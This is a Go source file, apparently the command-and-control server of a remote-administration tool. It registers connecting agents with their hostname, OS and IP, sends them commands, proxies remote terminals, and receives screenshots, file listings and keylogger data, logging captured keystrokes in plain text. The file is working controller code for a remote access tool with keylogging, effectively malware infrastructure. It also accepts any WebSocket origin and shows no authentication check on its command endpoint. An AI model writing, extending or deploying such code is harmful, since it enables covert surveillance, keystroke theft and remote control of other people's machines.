package server

import (
	"crypto/tls"
	"encoding/json"
	"log"
	"net/http"
	"time"

	"mww2.com/server_manager/common"

	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  4096,
	WriteBufferSize: 4096,
	CheckOrigin: func(r *http.Request) bool {
		return true // In production, implement proper origin checking
	},
}

// Server represents the main server
type Server struct {
	manager       *ClientManager
	config        *Config
	authenticator *Authenticator
	webHandler    *WebHandler
	terminalProxy *TerminalProxy
}

// Config holds server configuration
type Config struct {
	Address     string
	CertFile    string
	KeyFile     string
	AuthToken   string
	UseTLS      bool
	WebUsername string
	WebPassword string
}

// NewServer creates a new server instance
func NewServer(config *Config) *Server {
	manager := NewClientManager()
	sessionMgr := NewSessionManager(24 * time.Hour)
	terminalProxy := NewTerminalProxy(manager, sessionMgr)

	webConfig := &WebConfig{
		Username: config.WebUsername,
		Password: config.WebPassword,
	}

	webHandler, err := NewWebHandler(sessionMgr, manager, webConfig)
	if err != nil {
		log.Fatalf("Failed to create web handler: %v", err)
	}

	return &Server{
		manager:       manager,
		config:        config,
		authenticator: NewAuthenticator(config.AuthToken),
		webHandler:    webHandler,
		terminalProxy: terminalProxy,
	}
}

// Start starts the server
func (s *Server) Start() error {
	go s.manager.Run()

	mux := http.NewServeMux()

	// WebSocket endpoint for clients
	mux.HandleFunc("/ws", s.handleWebSocket)

	// API endpoints
	mux.HandleFunc("/api/clients", s.webHandler.HandleClientsAPI)
	mux.HandleFunc("/api/command", s.handleSendCommand)
	mux.HandleFunc("/api/terminal", s.terminalProxy.HandleTerminalWebSocket)

	// Web UI routes
	s.webHandler.RegisterWebRoutes(mux)

	log.Printf("Server starting on %s", s.config.Address)

	// Only use TLS if explicitly enabled (default is HTTP for nginx reverse proxy)
	if s.config.UseTLS && s.config.CertFile != "" && s.config.KeyFile != "" {
		tlsConfig := &tls.Config{
			MinVersion: tls.VersionTLS12,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			},
		}

		server := &http.Server{
			Addr:      s.config.Address,
			Handler:   mux,
			TLSConfig: tlsConfig,
		}

		log.Printf("Using direct TLS")
		return server.ListenAndServeTLS(s.config.CertFile, s.config.KeyFile)
	}

	log.Printf("Using HTTP (TLS should be handled by reverse proxy)")
	return http.ListenAndServe(s.config.Address, mux)
}

// handleWebSocket handles WebSocket connections
func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("WebSocket upgrade error: %v", err)
		return
	}

	// Wait for authentication message
	var authMsg common.Message
	err = conn.ReadJSON(&authMsg)
	if err != nil {
		log.Printf("Failed to read auth message: %v", err)
		conn.Close()
		return
	}

	if authMsg.Type != common.MsgTypeAuth {
		log.Printf("Expected auth message, got: %s", authMsg.Type)
		conn.Close()
		return
	}

	var authPayload common.AuthPayload
	err = authMsg.ParsePayload(&authPayload)
	if err != nil {
		log.Printf("Failed to parse auth payload: %v", err)
		conn.Close()
		return
	}

	// Authenticate client
	authenticated, token := s.authenticator.Authenticate(&authPayload)

	// Send authentication response
	respPayload := &common.AuthResponsePayload{
		Success: authenticated,
		Token:   token,
	}

	if !authenticated {
		respPayload.Message = "Authentication failed"
		respMsg, _ := common.NewMessage(common.MsgTypeAuthResponse, respPayload)
		conn.WriteJSON(respMsg)
		conn.Close()
		return
	}

	respPayload.Message = "Authentication successful"
	respMsg, _ := common.NewMessage(common.MsgTypeAuthResponse, respPayload)
	conn.WriteJSON(respMsg)

	// Create client
	client := &Client{
		ID:   authPayload.ClientID,
		Conn: conn,
		Metadata: &common.ClientMetadata{
			ID:          authPayload.ClientID,
			Token:       token,
			OS:          authPayload.OS,
			Arch:        authPayload.Arch,
			Hostname:    authPayload.Hostname,
			IP:          authPayload.IP,
			Status:      "online",
			ConnectedAt: time.Now(),
			LastSeen:    time.Now(),
		},
		Send: make(chan *common.Message, 256),
	}

	s.manager.register <- client

	// Start goroutines for reading and writing
	go s.readPump(client)
	go s.writePump(client)
}

// readPump reads messages from the client
func (s *Server) readPump(client *Client) {
	defer func() {
		s.manager.unregister <- client
		client.Conn.Close()
	}()

	client.Conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	client.Conn.SetPongHandler(func(string) error {
		client.Conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		return nil
	})

	for {
		var msg common.Message
		err := client.Conn.ReadJSON(&msg)
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("WebSocket error: %v", err)
			}
			break
		}

		// Update last seen
		s.manager.UpdateClientMetadata(client.ID, func(m *common.ClientMetadata) {
			m.LastSeen = time.Now()
		})

		// Handle message
		s.handleMessage(client, &msg)
	}
}

// writePump writes messages to the client
func (s *Server) writePump(client *Client) {
	ticker := time.NewTicker(54 * time.Second)
	defer func() {
		ticker.Stop()
		client.Conn.Close()
	}()

	for {
		select {
		case message, ok := <-client.Send:
			client.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if !ok {
				client.Conn.WriteMessage(websocket.CloseMessage, []byte{})
				return
			}

			err := client.Conn.WriteJSON(message)
			if err != nil {
				return
			}

		case <-ticker.C:
			client.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if err := client.Conn.WriteMessage(websocket.PingMessage, nil); err != nil {
				return
			}
		}
	}
}

// handleMessage handles incoming messages from clients
func (s *Server) handleMessage(client *Client, msg *common.Message) {
	switch msg.Type {
	case common.MsgTypeHeartbeat:
		var hb common.HeartbeatPayload
		if err := msg.ParsePayload(&hb); err == nil {
			s.manager.UpdateClientMetadata(client.ID, func(m *common.ClientMetadata) {
				m.Status = hb.Status
				m.LastHeartbeat = time.Now()
			})
		}

	case common.MsgTypeCommandResult:
		log.Printf("Command result from %s: %s", client.ID, string(msg.Payload))

	case common.MsgTypeFileList:
		log.Printf("File list from %s", client.ID)

	case common.MsgTypeScreenshotData:
		log.Printf("Screenshot received from %s", client.ID)

	case common.MsgTypeKeyloggerData:
		var kld common.KeyloggerDataPayload
		if err := msg.ParsePayload(&kld); err == nil {
			log.Printf("Keylogger data from %s: %s", client.ID, kld.Keys)
		}

	case common.MsgTypeUpdateStatus:
		var us common.UpdateStatusPayload
		if err := msg.ParsePayload(&us); err == nil {
			log.Printf("Update status from %s: %s - %s", client.ID, us.Status, us.Message)
		}

	case common.MsgTypeTerminalOutput:
		var to common.TerminalOutputPayload
		if err := msg.ParsePayload(&to); err == nil {
			s.terminalProxy.HandleTerminalOutput(to.SessionID, to.Data, false)
		}

	case common.MsgTypePong:
		// Heartbeat response

	default:
		log.Printf("Unknown message type from %s: %s", client.ID, msg.Type)
	}
}

// handleGetClients returns list of connected clients
func (s *Server) handleGetClients(w http.ResponseWriter, r *http.Request) {
	clients := s.manager.GetAllClients()
	metadata := make([]*common.ClientMetadata, len(clients))

	for i, client := range clients {
		client.mu.RLock()
		metadata[i] = client.Metadata
		client.mu.RUnlock()
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(metadata)
}

// handleSendCommand sends a command to a specific client
func (s *Server) handleSendCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		ClientID string                       `json:"client_id"`
		Command  common.ExecuteCommandPayload `json:"command"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	msg, err := common.NewMessage(common.MsgTypeExecuteCommand, req.Command)
	if err != nil {
		http.Error(w, "Failed to create message", http.StatusInternalServerError)
		return
	}

	if err := s.manager.SendToClient(req.ClientID, msg); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(map[string]string{"status": "sent"})
}
